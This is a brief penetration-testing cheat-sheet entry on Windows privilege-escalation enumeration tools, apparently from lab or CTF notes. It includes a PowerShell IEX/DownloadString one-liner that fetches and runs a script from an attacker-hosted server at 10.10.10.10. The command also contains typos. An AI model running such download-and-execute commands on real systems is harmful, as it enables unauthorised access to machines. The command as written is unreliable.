## Tools

https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/

Jaws Scripts - JAWS - Just Another Windows (Enum) Script 

##### Executing Jaws scripts  

- On local system - `python –m simplehttpserver` 
- On windows machine – `IEX(New-Object Net WebClient).downloadString('http://10.10.10.10:8080/jaws.ps1')`